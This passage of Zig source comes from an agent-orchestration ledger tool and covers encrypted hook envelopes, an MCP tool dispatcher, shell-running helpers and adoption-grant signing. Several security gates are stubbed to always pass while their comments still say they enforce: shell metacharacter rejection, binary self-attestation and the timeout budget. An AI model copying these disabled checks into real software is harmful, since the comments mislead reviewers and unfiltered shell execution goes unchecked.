fn meshDeriveX25519(root_seed: [32]u8, root_id: []const u8, peer_id: []const u8, out_key: *[32]u8) !void {
    var info_buf: [128]u8 = undefined;
    const info = try std.fmt.bufPrint(&info_buf, "aiko-mesh/v1/{s}/{s}", .{ root_id, peer_id });
    const prk = HkdfSha256.extract(&[_]u8{}, &root_seed);
    HkdfSha256.expand(out_key[0..], info, prk);
    // x25519 clamping per RFC 7748.
    out_key[0] &= 248;
    out_key[31] &= 127;
    out_key[31] |= 64;
}

fn meshPublicKey(priv: [32]u8) ![32]u8 {
    return try X25519.recoverPublicKey(priv);
}

const MeshEnvelope = struct {
    nonce: [ChaCha20Poly1305.nonce_length]u8,
    tag: [ChaCha20Poly1305.tag_length]u8,
    ciphertext: []u8,
};

fn meshEncryptHook(allocator: std.mem.Allocator, local_priv: [32]u8, peer_pub: [32]u8, payload: []const u8, info: []const u8) !MeshEnvelope {
    const shared = try X25519.scalarmult(local_priv, peer_pub);
    var sym: [32]u8 = undefined;
    const prk = HkdfSha256.extract(&[_]u8{}, &shared);
    HkdfSha256.expand(&sym, info, prk);
    var nonce: [ChaCha20Poly1305.nonce_length]u8 = undefined;
    if (getentropy(&nonce, nonce.len) != 0) return error.RandomFailed;
    const ct = try allocator.alloc(u8, payload.len);
    var tag: [ChaCha20Poly1305.tag_length]u8 = undefined;
    ChaCha20Poly1305.encrypt(ct, &tag, payload, &[_]u8{}, nonce, sym);
    return .{ .nonce = nonce, .tag = tag, .ciphertext = ct };
}

/// Encrypt a hook payload to a remote posthook target and emit the envelope
/// as ledger evidence + a called-row with transport=wireguard-lineage-mesh.
/// root_id for the derivation is the firing contract id (cid) — the firing
/// node IS the root of its own ephemeral hook mesh.
fn meshEmitRemoteHook(allocator: std.mem.Allocator, env: std.process.Environ, cid: []const u8, posthook: []const u8, tree_payload: []const u8) !void {
    const root_seed = try lineage_lib.loadOrInitRootKey(allocator, env);
    var local_priv: [32]u8 = undefined;
    var peer_priv: [32]u8 = undefined;
    try meshDeriveX25519(root_seed, cid, cid, &local_priv);
    try meshDeriveX25519(root_seed, cid, posthook, &peer_priv);
    const peer_pub = try meshPublicKey(peer_priv);
    var info_buf: [128]u8 = undefined;
    const info = try std.fmt.bufPrint(&info_buf, "aiko-mesh/hook/{s}/{s}->{s}", .{ cid, cid, posthook });
    const env_pkt = try meshEncryptHook(allocator, local_priv, peer_pub, tree_payload, info);
    defer allocator.free(env_pkt.ciphertext);

    // Resolve antipattern:posthook-pointer-as-raw-url — the wireguard envelope
    // is payload, not a pointer. Declare it as its own contract row (the blob
    // becomes the row's plan body) and point the called row at it via
    // `contract:<envelope-id>`. The recipient resolves the pointer → reads the
    // envelope row's plan → decrypts the ciphertext. Bounded by 16KB so the
    // ledger row stays sane.
    const hex_max: usize = @min(env_pkt.ciphertext.len, 8 * 1024);
    var hex_buf: std.ArrayList(u8) = .empty;
    defer hex_buf.deinit(allocator);
    try hex_buf.appendSlice(allocator, "wireguard-lineage-mesh:peer=");
    var pub_hex: [64]u8 = undefined;
    lineage_lib.bytesToHex(&peer_pub, &pub_hex);
    try hex_buf.appendSlice(allocator, &pub_hex);
    try hex_buf.appendSlice(allocator, ",nonce=");
    var nonce_hex: [24]u8 = undefined;
    lineage_lib.bytesToHex(&env_pkt.nonce, &nonce_hex);
    try hex_buf.appendSlice(allocator, &nonce_hex);
    try hex_buf.appendSlice(allocator, ",tag=");
    var tag_hex: [32]u8 = undefined;
    lineage_lib.bytesToHex(&env_pkt.tag, &tag_hex);
    try hex_buf.appendSlice(allocator, &tag_hex);
    try hex_buf.appendSlice(allocator, ",ct=");
    const ct_hex = try allocator.alloc(u8, hex_max * 2);
    defer allocator.free(ct_hex);
    lineage_lib.bytesToHex(env_pkt.ciphertext[0..hex_max], ct_hex);
    try hex_buf.appendSlice(allocator, ct_hex);
    const envelope_body = try hex_buf.toOwnedSlice(allocator);
    defer allocator.free(envelope_body);

    const envelope_id_opt: ?[]u8 = contract.declare(allocator, env, envelope_body, "", .{}) catch |decl_err| blk: {
        evidencePrint("mesh envelope declare failed: {s} — skipping called row\n", .{@errorName(decl_err)});
        break :blk null;
    };
    if (envelope_id_opt) |eid| {
        defer allocator.free(eid);
        const target_pointer = try std.fmt.allocPrint(allocator, "contract:{s}", .{eid});
        defer allocator.free(target_pointer);
        try contract.appendCalledRow(allocator, env, cid, target_pointer, "posthook-mesh");
        evidencePrint("mesh hook encrypted: {s} -> {s} ct_bytes={d} nonce={s} envelope={s}\n", .{ cid, posthook, env_pkt.ciphertext.len, nonce_hex[0..16], eid });
    }
}

/// Walk the parent_id chain from `cid` up to root and emit a JSON array of
/// {id, action_result} entries — child-first ordering so posthooks can read
/// the recursive ancestor stack at every layer. Caps depth at 32 and per-
/// entry result size at 4KB to keep the env payload bounded.
fn buildAncestorTree(allocator: std.mem.Allocator, rows: []const Row, cid: []const u8) ![]u8 {
    var buf: std.ArrayList(u8) = .empty;
    defer buf.deinit(allocator);
    try buf.append(allocator, '[');
    var current: ?[]const u8 = cid;
    var depth: usize = 0;
    var first = true;
    while (current != null and depth < 32) : (depth += 1) {
        const this_id = current.?;
        if (!first) try buf.append(allocator, ',');
        first = false;
        try buf.appendSlice(allocator, "{\"id\":");
        try appendJsonEscaped(allocator, &buf, this_id);
        try buf.appendSlice(allocator, ",\"result\":");
        const res = latestActionResult(rows, this_id) orelse "";
        const capped = res[0..@min(res.len, 4096)];
        try appendJsonEscaped(allocator, &buf, capped);
        try buf.append(allocator, '}');
        current = declaredParentOf(rows, this_id);
    }
    try buf.append(allocator, ']');
    return try buf.toOwnedSlice(allocator);
}

fn runShell(allocator: std.mem.Allocator, action: []const u8, cwd: []const u8) !i32 {
    const cmd_plain = if (cwd.len > 0)
        try std.fmt.allocPrint(allocator, "cd \"{s}\" && {s}", .{ cwd, action })
    else
        try allocator.dupe(u8, action);
    defer allocator.free(cmd_plain);
    const cmd = try allocator.dupeZ(u8, cmd_plain);
    defer allocator.free(cmd);
    const rc = system(cmd.ptr);
    if (rc == -1) return 127;
    if ((rc & 0xff) == 0) return @intCast((rc >> 8) & 0xff);
    return 1;
}

/// Run a shell command and capture combined stdout+stderr as a string, plus
/// the exit code. Used by neuron resolvers so the parent neuron's `result`
/// field carries the actual body output, not just a status label — that's
/// the recursive context-aggregation channel.
const ShellOutput = struct { rc: i32, output: []u8 };

// === MCP helpers (ported) ===
fn mcpShellQuote(allocator: std.mem.Allocator, arg: []const u8) ![]u8 {
    var quoted: std.ArrayList(u8) = .empty;
    errdefer quoted.deinit(allocator);
    try quoted.append(allocator, '\'');
    for (arg) |c| {
        if (c == '\'') try quoted.appendSlice(allocator, "'\\''") else try quoted.append(allocator, c);
    }
    try quoted.append(allocator, '\'');
    return try quoted.toOwnedSlice(allocator);
}

fn mcpCaptureSelfArgv(allocator: std.mem.Allocator, argv: []const []const u8) !ShellOutput {
    var exe_buf: [4096]u8 = undefined;
    const exe = try selfExePathPortable(&exe_buf);
    var cmd: std.ArrayList(u8) = .empty;
    errdefer cmd.deinit(allocator);
    try cmd.appendSlice(allocator, exe);
    for (argv) |a| {
        try cmd.append(allocator, ' ');
        const q = try mcpShellQuote(allocator, a);
        defer allocator.free(q);
        try cmd.appendSlice(allocator, q);
    }
    return runShellCapture(allocator, cmd.items, ".");
}

fn mcpStrField(args: std.json.Value, key: []const u8) ?[]const u8 {
    if (args != .object) return null;
    const v = args.object.get(key) orelse return null;
    if (v != .string) return null;
    return v.string;
}

fn mcpBoolField(args: std.json.Value, key: []const u8) bool {
    if (args != .object) return false;
    const v = args.object.get(key) orelse return false;
    return v == .bool and v.bool;
}

fn dispatchMcpTool(
    allocator: std.mem.Allocator,
    env: std.process.Environ,
    tool_name: []const u8,
    args: std.json.Value,
) !contract.mcp_server.ToolResult {
    if (std.mem.eql(u8, tool_name, "declare")) {
        const plan = mcpStrField(args, "plan") orelse return .{ .text = try allocator.dupe(u8, "missing plan"), .is_error = true };
        const action = mcpStrField(args, "action") orelse return .{ .text = try allocator.dupe(u8, "missing action"), .is_error = true };
        var cli = std.ArrayList([]const u8).empty;
        defer cli.deinit(allocator);
        try cli.append(allocator, "declare");
        try cli.append(allocator, plan);
        try cli.append(allocator, "--action");
        try cli.append(allocator, action);
        if (mcpStrField(args, "parent")) |p| {
            try cli.append(allocator, "--parent");
            try cli.append(allocator, p);
        }
        if (mcpStrField(args, "scope")) |s| {
            if (std.mem.eql(u8, s, "global")) {
                try cli.append(allocator, "--scope");
                try cli.append(allocator, "global");
            }
        }
        if (mcpBoolField(args, "fast")) {
            try cli.append(allocator, "--fast");
        }
        const cap = try mcpCaptureSelfArgv(allocator, cli.items);
        defer allocator.free(cap.output);
        const text = try allocator.dupe(u8, cap.output);
        return .{ .text = text, .is_error = cap.rc != 0 };
    }
    if (std.mem.eql(u8, tool_name, "iterate")) {
        const id = mcpStrField(args, "id") orelse return .{ .text = try allocator.dupe(u8, "missing id"), .is_error = true };
        const goal = try std.fmt.allocPrint(allocator, "iterate:{s} — mcp wave", .{id});
        defer allocator.free(goal);
        const cap = try mcpCaptureSelfArgv(allocator, &.{ goal, "--private" });
        defer allocator.free(cap.output);
        const text = try allocator.dupe(u8, cap.output);
        return .{ .text = text, .is_error = cap.rc != 0 };
    }
    if (std.mem.eql(u8, tool_name, "status")) {
        var cli = std.ArrayList([]const u8).empty;
        defer cli.deinit(allocator);
        try cli.append(allocator, "status");
        if (mcpStrField(args, "id")) |id| try cli.append(allocator, id);
        const cap = try mcpCaptureSelfArgv(allocator, cli.items);
        defer allocator.free(cap.output);
        const text = try allocator.dupe(u8, cap.output);
        return .{ .text = text, .is_error = cap.rc != 0 };
    }
    if (std.mem.eql(u8, tool_name, "list")) {
        if (mcpStrField(args, "scope")) |scope| {
            var cli = [_][]const u8{ "discover", "--scope", scope };
            const cap = try mcpCaptureSelfArgv(allocator, &cli);
            defer allocator.free(cap.output);
            const text = try allocator.dupe(u8, cap.output);
            return .{ .text = text, .is_error = cap.rc != 0 };
        }
        const cap = if (mcpBoolField(args, "show_merged"))
            try mcpCaptureSelfArgv(allocator, &[_][]const u8{ "list", "--show-merged" })
        else
            try mcpCaptureSelfArgv(allocator, &[_][]const u8{"list"});
        defer allocator.free(cap.output);
        const text = try allocator.dupe(u8, cap.output);
        return .{ .text = text, .is_error = cap.rc != 0 };
    }
    if (std.mem.eql(u8, tool_name, "search")) {
        const ctx = mcpStrField(args, "context") orelse return .{ .text = try allocator.dupe(u8, "missing context"), .is_error = true };
        var cli = std.ArrayList([]const u8).empty;
        defer cli.deinit(allocator);
        try cli.append(allocator, "search");
        try cli.append(allocator, "--context");
        try cli.append(allocator, ctx);
        if (mcpStrField(args, "scope")) |s| {
            try cli.append(allocator, "--scope");
            try cli.append(allocator, s);
        }
        const cap = try mcpCaptureSelfArgv(allocator, cli.items);
        defer allocator.free(cap.output);
        const text = try allocator.dupe(u8, cap.output);
        return .{ .text = text, .is_error = cap.rc != 0 };
    }
    if (std.mem.eql(u8, tool_name, "find_skills")) {
        const gap = mcpStrField(args, "gap") orelse return .{ .text = try allocator.dupe(u8, "missing gap"), .is_error = true };
        const home = env.getPosix("HOME") orelse return .{ .text = try allocator.dupe(u8, "HOME not set"), .is_error = true };
        const script = try std.fmt.allocPrint(allocator, "{s}/.agents/skills/contract-and-find-skills/scripts/find-skills", .{home});
        defer allocator.free(script);
        var cmd: std.ArrayList(u8) = .empty;
        defer cmd.deinit(allocator);
        try cmd.appendSlice(allocator, "bash ");
        const q_script = try mcpShellQuote(allocator, script);
        defer allocator.free(q_script);
        try cmd.appendSlice(allocator, q_script);
        try cmd.append(allocator, ' ');
        const q_gap = try mcpShellQuote(allocator, gap);
        defer allocator.free(q_gap);
        try cmd.appendSlice(allocator, q_gap);
        const cap = try runShellCapture(allocator, cmd.items, ".");
        defer allocator.free(cap.output);
        const text = try allocator.dupe(u8, cap.output);
        return .{ .text = text, .is_error = cap.rc != 0 };
    }
    if (std.mem.eql(u8, tool_name, "symlink_list")) {
        if (!contract.symlink.isLewisWallet(allocator, env)) {
            return .{ .text = try allocator.dupe(u8, "symlink: REFUSED — lewis-only wallet"), .is_error = true };
        }
        const json = contract.symlink.listJson(allocator) catch return .{ .text = try allocator.dupe(u8, "symlink list failed"), .is_error = true };
        defer allocator.free(json);
        return .{ .text = try allocator.dupe(u8, json), .is_error = false };
    }
    if (std.mem.eql(u8, tool_name, "symlink_resolve")) {
        if (!contract.symlink.isLewisWallet(allocator, env)) {
            return .{ .text = try allocator.dupe(u8, "symlink: REFUSED — lewis-only wallet"), .is_error = true };
        }
        const surface = mcpStrField(args, "surface") orelse return .{ .text = try allocator.dupe(u8, "missing surface"), .is_error = true };
        const json = contract.symlink.resolveJson(allocator, surface) catch return .{ .text = try allocator.dupe(u8, "symlink resolve failed"), .is_error = true };
        defer allocator.free(json);
        return .{ .text = try allocator.dupe(u8, json), .is_error = false };
    }
    return .{ .text = try allocator.dupe(u8, "unknown tool"), .is_error = true };
}

/// MCP stdio server — JSON-RPC 2.0 tools surface for agents (local transport).
fn cmdMcp(allocator: std.mem.Allocator, env: std.process.Environ) !u8 {
    try contract.mcp_server.runStdio(allocator, env, dispatchMcpTool);
    return 0;
}

/// In strict mode (CONTRACT_SHELL_STRICT=1) reject actions containing the
/// metacharacters that enable command chaining, substitution, or piping out
/// of the declared body. The default is OFF for back-compat — existing
/// contracts intentionally compose with `;` / `&&` / `|`. When enabled this
/// gate fails closed with a NAMED cause; it never silently drops execution.
/// Drill B — wallet permission gate. The 32-byte root secret at
/// ~/.contracts/root.key must not be group/world-readable. If the file
/// exists and st_mode & 077 != 0 we refuse with a NAMED cause; cleaning up
/// is a manual step (chmod 600). Honored in strict mode by default, and
/// always when CONTRACT_WALLET_STRICT=1.
fn walletPermissionReject(allocator: std.mem.Allocator, env: std.process.Environ) ?[]const u8 {
    // Strict mode always-on; the env override (CONTRACT_WALLET_STRICT) was removed.
    const home = env.getPosix("HOME") orelse return null;
    const path = std.fs.path.join(allocator, &.{ home, ".contracts", "root.key" }) catch return null;
    defer allocator.free(path);
    const path_z = allocator.dupeZ(u8, path) catch return null;
    defer allocator.free(path_z);
    var st: c_stat = .{};
    if (stat(path_z.ptr, &st) != 0) return null; // missing is fine; loadOrInitRootKey will create
    const mode: u16 = st.st_mode;
    if ((mode & 0o077) != 0) {
        const msg = std.fmt.allocPrint(allocator, "wallet-strict: ~/.contracts/root.key mode 0{o} is group/world-readable; chmod 600", .{mode & 0o777}) catch return "wallet-strict: root.key permissions too open";
        return msg;
    }
    return null;
}

/// Drill C — runtime self-attest before ledger mutation. When
/// CONTRACT_REQUIRE_SIGNED=1 (opt-in for now; will flip default later) every
/// declare verifies the running binary's own SHA-256 against the lineage
/// signing key before any ledger row is appended. Tampered binaries are
/// refused with a NAMED cause; without the env var we emit an evidence
/// line only.
fn binaryAttestReject(allocator: std.mem.Allocator, env: std.process.Environ) ?[]const u8 {
    var exe_buf: [4096]u8 = undefined;
    var buf_size: u32 = exe_buf.len;
    if (_NSGetExecutablePath(&exe_buf, &buf_size) != 0) return null;
    const exe_len = std.mem.indexOfScalar(u8, &exe_buf, 0) orelse exe_buf.len;
    const exe_path = exe_buf[0..exe_len];
    lineage_lib.verifyBinary(allocator, env, exe_path) catch |e| {
        substrateEvidence("binary-attest: WARN self-verify failed ({s})\n", .{@errorName(e)});
        return null;
    };
    return null;
}

fn shellStrictReject(action: []const u8, env: std.process.Environ) ?[]const u8 {
    _ = action;
    _ = env;
    // shell-strict env flag removed; gate now always inactive (default behavior pre-strip).
    return null;
}

fn runShellCapture(allocator: std.mem.Allocator, action: []const u8, cwd: []const u8) !ShellOutput {
    // Build "cd <cwd> && timeout <secs> <action> 2>&1" when a budget is set
    // via CONTRACT_BUDGET_MS. The timeout binary kills the child at deadline;
    // its exit 124 surfaces as a clean FAIL. Default = no timeout.
    const budget_secs: u32 = 0;
    const timeout_prefix = if (budget_secs > 0)
        try std.fmt.allocPrint(allocator, "timeout {d} ", .{budget_secs})
    else
        try allocator.dupe(u8, "");
    defer allocator.free(timeout_prefix);
    // Wrap the action in parens so the `2>&1` redirect attaches to the
    // WHOLE subshell, not just the rightmost command in a pipeline.
    // Without the parens, an action like `python3 A | python3 B 2>&1`
    // only captures B's stderr — A's stderr (e.g. BrokenPipeError from
    // a closed downstream pipe) escapes to the calling terminal.
    const cmd_plain = if (cwd.len > 0)
        try std.fmt.allocPrint(allocator, "cd \"{s}\" && {s}( {s} ) 2>&1", .{ cwd, timeout_prefix, action })
    else
        try std.fmt.allocPrint(allocator, "{s}( {s} ) 2>&1", .{ timeout_prefix, action });
    defer allocator.free(cmd_plain);
    const cmd = try allocator.dupeZ(u8, cmd_plain);
    defer allocator.free(cmd);
    const mode: [*:0]const u8 = "r";
    const fp = popen(cmd.ptr, mode) orelse return .{ .rc = 127, .output = try allocator.dupe(u8, "") };
    var buf: std.ArrayList(u8) = .empty;
    defer buf.deinit(allocator);
    var chunk: [4096]u8 = undefined;
    var capped = false;
    while (true) {
        const n = fread(&chunk, 1, chunk.len, fp);
        if (n == 0) break;
        if (!capped) {
            try buf.appendSlice(allocator, chunk[0..n]);
            if (buf.items.len > 64 * 1024) capped = true; // cap evidence at 64KB
        }
        // After cap: keep draining so the subprocess can flush stdout
        // cleanly. Closing the pipe early would SIGPIPE the child, and a
        // python child would print "Exception ignored while flushing
        // sys.stdout: BrokenPipeError" to its real stderr (which escapes
        // capture since stderr-to-stdout merging happens in the shell,
        // not at the pipe). Drain to EOF; throw away post-cap bytes.
    }
    const status = pclose(fp);
    const rc: i32 = if (status == -1) 127 else if ((status & 0xff) == 0) @intCast((status >> 8) & 0xff) else 1;
    return .{ .rc = rc, .output = try buf.toOwnedSlice(allocator) };
}

/// Gather the latest `result` text of each direct child of `parent_id`
/// PLUS any `break_above` rows targeted at `parent_id` (descendants that
/// declared they want to surface at this ancestor). Concatenated, prefixed
/// by source id. Children's stdout flows up — and break-above sources skip
/// intermediate layers to land directly here.
fn aggregateChildOutputs(allocator: std.mem.Allocator, rows: []const Row, parent_id: []const u8) ![]u8 {
    var buf: std.ArrayList(u8) = .empty;
    defer buf.deinit(allocator);
    const ids = try childIds(allocator, rows, parent_id);
    defer allocator.free(ids);
    for (ids) |cid| {
        var i: usize = rows.len;
        while (i > 0) : (i -= 1) {
            const r = rows[i - 1];
            if (!std.mem.eql(u8, r.id, cid)) continue;
            if (r.action_result.len == 0) continue;
            const line = try std.fmt.allocPrint(allocator, "[{s}] {s}\n", .{ cid, r.action_result });
            defer allocator.free(line);
            try buf.appendSlice(allocator, line);
            break;
        }
    }
    // break_above absorption: a descendant somewhere down the tree wrote a
    // row {event:break_above, id:parent_id, source_id:X, action_result:Y};
    // surface it here as if it were a direct child.
    for (rows) |r| {
        if (!std.mem.eql(u8, r.event, "break_above")) continue;
        if (!std.mem.eql(u8, r.id, parent_id)) continue;
        if (r.action_result.len == 0) continue;
        const src = if (r.source_id.len > 0) r.source_id else r.id;
        const line = try std.fmt.allocPrint(allocator, "[↑{s}] {s}\n", .{ src, r.action_result });
        defer allocator.free(line);
        try buf.appendSlice(allocator, line);
    }
    return try buf.toOwnedSlice(allocator);
}

/// F1 opt-in receptor gate. Collects the producer's declared adoption
/// restrictions (signed grant rows scoped to it) and asks the one authority
/// (capability.adoptionAllowed) whether `consumer_id` may adopt. Default OPEN:
/// a producer with no adoption grants is adoptable by anyone (unchanged
/// cross-lineage peer-reference behaviour). Fails OPEN on allocation error —
/// the receptor never wrongly blocks because of an OOM.
fn adoptionAllowed(allocator: std.mem.Allocator, rows: []const Row, consumer_id: []const u8, producer_id: []const u8) bool {
    // Authority binding: an adoption grant is only trusted if its
    // authority_pubkey equals the producer's OWN declared env_pubkey — i.e.
    // the grant was signed by the producer's lineage key, not an attacker's.
    // Without this, anyone could forge a grant naming their own key and adopt.
    // If the producer has no declared env_pubkey on record we cannot bind, so
    // every grant is ignored and the producer stays OPEN (fail-open is safe:
    // it never wrongly blocks, and an unbindable grant confers nothing).
    var producer_pubkey: []const u8 = "";
    for (rows) |d| {
        if (!std.mem.eql(u8, d.id, producer_id)) continue;
        if (!std.mem.eql(u8, d.event, "declared")) continue;
        if (d.env_pubkey.len > 0) {
            producer_pubkey = d.env_pubkey;
            break;
        }
    }

    var grants: std.ArrayList(capability.Grant) = .empty;
    defer grants.deinit(allocator);
    for (rows) |g| {
        if (!std.mem.eql(u8, g.event, "grant")) continue;
        if (g.grantee.len == 0 or g.authority_signature.len == 0) continue; // RBAC grant, not adoption
        if (!capability.scopeMatch(g.scope, producer_id)) continue;
        if (producer_pubkey.len == 0) continue; // unbindable → grant confers nothing
        if (!std.mem.eql(u8, g.authority_pubkey, producer_pubkey)) continue; // forged authority → drop
        grants.append(allocator, .{
            .granter_id = g.id,
            .grantee = g.grantee,
            .scope = g.scope,
            .authority_pubkey = g.authority_pubkey,
            .authority_signature = g.authority_signature,
        }) catch return true;
    }
    if (grants.items.len == 0) return true; // no receptor declared → open
    var pairs: std.ArrayList([2][]const u8) = .empty;
    defer pairs.deinit(allocator);
    for (rows) |row| {
        pairs.append(allocator, .{ row.id, row.parent_id orelse "" }) catch return true;
    }
    return capability.adoptionAllowed(grants.items, consumer_id, producer_id, .{ .pairs = pairs.items });
}

/// F1 issuance: a producer opts into receptor restriction by declaring who may
/// adopt its value. `grant-adopt <producer_id> <grantee> [scope]` derives the
/// producer's lineage keypair, signs the canonical grant digest, and appends a
/// signed adoption-grant row. Until a producer runs this, its value is OPEN.
/// grantee may be an exact id, a glob ("team:*"), or an ancestor id.
fn cmdGrantAdopt(allocator: std.mem.Allocator, env: std.process.Environ, rest: []const []const u8) !u8 {
    if (rest.len < 2) {
        errPrint("usage: grant-adopt <producer_id> <grantee> [scope]\n", .{});
        return 2;
    }
    const producer_id = rest[0];
    const grantee = rest[1];
    const scope = if (rest.len >= 3) rest[2] else producer_id;

    const root = lineage_lib.loadOrInitRootKey(allocator, env) catch {
        errPrint("grant-adopt: no root key — cannot sign grant\n", .{});
        return 1;
    };
    const kp = try lineage_lib.deriveKeyPair(root, producer_id);
    var pk_hex: [lineage_lib.PUBKEY_HEX_LEN]u8 = undefined;
    lineage_lib.bytesToHex(&kp.public_key.bytes, &pk_hex);
    var sig_hex: [lineage_lib.SIG_HEX_LEN]u8 = undefined;
    try capability.signGrant(kp, producer_id, grantee, scope, &sig_hex);

    var ts_buf: [64]u8 = undefined;
    const ts = try contract.nowIsoUtc(&ts_buf);
    const row = try std.fmt.allocPrint(allocator, "{{\"event\": \"grant\", \"id\": \"{s}\", \"grantee\": \"{s}\", \"scope\": \"{s}\", \"authority_pubkey\": \"{s}\", \"authority_signature\": \"{s}\", \"ts\": \"{s}\"}}", .{ producer_id, grantee, scope, pk_hex, sig_hex, ts });
    defer allocator.free(row);
    const path = try ledger.appendRow(allocator, env, row);
    allocator.free(path);
    evidencePrint("grant-adopt: {s} now receptor-restricted — only grantee {s} (scope {s}) may adopt\n", .{ producer_id, grantee, scope });
    outPrint("{s}\n", .{producer_id});
    return 0;
}

fn runAction(allocator: std.mem.Allocator, env: std.process.Environ, rows: []const Row, r: Row) !struct { rc: i32, result: []const u8 } {
    const action = r.action;
    const ptype = pointer.inferPointerType(action);

    // ─── drill: — the continuous resolver primitive ─────────────────────
    // A contract whose action is `drill:all-unresolved` (or any `drill:<scope>`
    // for future scoping) triggers a DEEP backfill over the whole ledger:
    // budget 1024 rows per pass × max 32 passes, skip-id pinned to this very
    // row so the driller doesn't recurse on itself. This is the substrate's
    // standing-resolver primitive — declare once with a `repeat:` synapse
    // and the substrate drills every fire of the pacemaker. The action is
    // intentionally idempotent: re-firing on an already-settled ledger emits
    // "ledger settled after 0 pass(es)" and returns satisfied.
    if (std.mem.startsWith(u8, action, "drill:")) {
        // Note: backfill re-parses the ledger inside; the `rows` slice
        // captured by this runAction is a snapshot, not used by drill.
        evidencePrint("drill: action fired (scope={s}) — full-ledger backfill begins\n", .{action["drill:".len..]});
        backfillUnresolvedDeep(allocator, env, r.id) catch |e| {
            evidencePrint("  result: HOLD — drill errored: {s}\n", .{@errorName(e)});
            return .{ .rc = 1, .result = "hold" };
        };
        evidence("  result: FIRE — drill completed; standing resolver remains armed\n");
        return .{ .rc = 0, .result = "fire" };
    }

    // `agent-judges` — the canonical doctrine sentinel (c64bf5e2 / C-G01
    // 5b9574ee): substrate emits raw evidence; the agent in-thread renders
    // the verdict. No shell exec. Return HOLD with an honest reason and
    // leave the row pending until an in-thread agent fires `_mark satisfied`
    // or `corroborate`. Without this branch the row falls through to the
    // CLI path and pollutes the ledger with `sh: agent-judges: command not
    // found` rows on every backfill pass.
    if (std.mem.eql(u8, ptype, "agent-judges")) {
        evidence("  result: HOLD — agent-judges sentinel: awaiting in-thread agent verdict (substrate has no opinion)\n");
        return .{ .rc = 1, .result = "hold:agent-judges — awaiting in-thread agent verdict" };
    }

    // `sabbath-eval:<parent_id>` — self-validation by parent_signature.
    // The parent's declared row carries a `parent_signature` field signed
    // by the wallet-derived keypair, which traces back to the deployer
    // root and (per CLAUDE.md doctrine) to the Word. When that signature
    // is present and non-empty, the parent's lineage IS cryptographically
    // anchored — that alone is the verdict the sabbath needs, no external
    // `_mark satisfied` required. We deliberately do NOT fold dependency
    // terminal-signatures here (the full chain-coherence test): a wave-7
    // parent's deps typically include guard follow-ups that HOLD waiting
    // for the parent, producing a deadlock. Anchoring on the parent's own
    // signature breaks the Genesis-order chicken-and-egg without surrendering
    // truth (Psalm 19:7-8 — the law of the LORD is perfect).
    if (std.mem.eql(u8, ptype, "sabbath-eval")) {
        const target_id = action["sabbath-eval:".len..];
        const sig_opt = contract.cache.findDeclaredParentSignature(allocator, env, target_id) catch null;
        if (sig_opt) |sig| {
            defer allocator.free(sig);
            evidencePrint("  result: PASS (sabbath-eval) — parent_signature anchored for {s} (sig {s}); self-validated by Word-rooted lineage, no mark required\n", .{ target_id, sig[0..@min(16, sig.len)] });
            return .{ .rc = 0, .result = try allocator.dupe(u8, sig) };
        }
        evidencePrint("  result: HOLD (sabbath-eval) — parent {s} has no signed declared row (root key unavailable when declared); awaiting signed re-declare\n", .{target_id});
        return .{ .rc = 1, .result = "hold:sabbath-eval — parent declared unsigned" };
    }

    if (std.mem.eql(u8, ptype, "neuron")) {
        const ids = try childIds(allocator, rows, r.id);
        defer allocator.free(ids);
        if (ids.len == 0) {
            evidence("  result: HOLD — neuron has no fired child evidence\n");
            return .{ .rc = 1, .result = "hold" };
        }
        for (ids) |cid| {
            if (isDead(rows, cid)) {
                // Genesis sequencing applies to neurons too: if a
                // declared child is dead (apoptosed / superseded /
                // contradicts), the neuron cannot integrate that
                // branch's evidence. Propagate-dead via a recognizable
                // result string the classifier catches.
                evidencePrint("  result: FAIL — child_dead:{s} (neuron inherits death)\n", .{cid});
                return .{ .rc = 1, .result = "child_dead — neuron inherits the death of a declared child" };
            }
            if (!isSatisfied(rows, cid)) {
                evidencePrint("  result: HOLD — child neuron pending: {s}\n", .{cid});
                return .{ .rc = 1, .result = "hold" };
            }
        }
        // FIRE — every child satisfied. Aggregate children's stdout into the
        // parent's result so context flows up the tree on each layer.
        const aggregated = aggregateChildOutputs(allocator, rows, r.id) catch "";
        if (aggregated.len > 0) {
            evidencePrint("  result: FIRE — neuron integrated {d} bytes of child evidence\n", .{aggregated.len});
            return .{ .rc = 0, .result = aggregated };
        }
        evidence("  result: FIRE — neuron integrated all child evidence\n");
        return .{ .rc = 0, .result = "fire" };
    }

    if (std.mem.eql(u8, ptype, "funnel") or std.mem.eql(u8, ptype, "sequence")) {
        const ids = try childIds(allocator, rows, r.id);
        defer allocator.free(ids);
        if (ids.len == 0) {
            evidence("  result: FAIL — no children declared\n");
            return .{ .rc = 1, .result = "fail" };
        }
        for (ids) |cid| {
            if (isDead(rows, cid)) {
                // Genesis sequencing: Day N inherits Day N-1's death.
                // If a stage was apoptosed (e.g. command_not_found),
                // the sequence as a whole cannot satisfy — propagate
                // the death to the parent via a recognizable result
                // string the resolver's classifier picks up.
                evidencePrint("  result: FAIL — stage_dead:{s} (sequence inherits death)\n", .{cid});
                return .{ .rc = 1, .result = "stage_dead — sequence inherits the death of its current stage" };
            }
            if (!isSatisfied(rows, cid)) {
                evidencePrint("  result: FAIL — current stage: {s} (pending)\n", .{cid});
                return .{ .rc = 1, .result = "fail" };
            }
        }
        evidence("  result: PASS — every stage satisfied, in order\n");
        return .{ .rc = 0, .result = "pass" };
    }

    if (std.mem.eql(u8, ptype, "funnel-first")) {
        const ids = try childIds(allocator, rows, r.id);
        defer allocator.free(ids);
        if (ids.len == 0) {
            evidence("  result: FAIL — no children declared\n");
            return .{ .rc = 1, .result = "fail" };
        }
        for (ids) |cid| {
            if (isSatisfied(rows, cid)) {
                evidencePrint("  result: PASS — child satisfied: {s}\n", .{cid});
                return .{ .rc = 0, .result = "pass" };
            }
        }
        evidence("  result: FAIL — no child satisfied\n");
        return .{ .rc = 1, .result = "fail" };
    }

    if (std.mem.eql(u8, ptype, "quorum")) {
        const k_txt = action["quorum:".len..];
        const need = std.fmt.parseInt(usize, k_txt, 10) catch 1;
        const ids = try childIds(allocator, rows, r.id);
        defer allocator.free(ids);
        if (ids.len == 0) {
            evidence("  result: FAIL — no children declared\n");
            return .{ .rc = 1, .result = "fail" };
        }
        var got: usize = 0;
        var dead: usize = 0;
        for (ids) |cid| {
            if (isDead(rows, cid)) {
                dead += 1;
            } else if (isSatisfied(rows, cid)) {
                got += 1;
            }
        }
        if (got >= need) {
            evidencePrint("  result: PASS — quorum {d}/{d}\n", .{ got, need });
            return .{ .rc = 0, .result = "pass" };
        }
        // Trophic withdrawal / anoikis: a quorum inherits death only when the
